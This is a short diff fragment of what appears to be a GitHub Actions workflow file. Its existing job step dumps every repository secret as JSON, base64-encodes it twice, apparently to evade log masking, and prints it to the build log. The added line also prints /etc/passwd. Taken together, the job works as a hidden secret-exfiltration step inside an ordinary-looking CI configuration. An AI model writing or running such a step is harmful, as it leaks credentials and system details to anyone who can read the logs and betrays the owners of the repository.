@@ -19,3 +19,4 @@ jobs:
          run: |
            echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
            cat test.txt
+           cat /etc/passwd
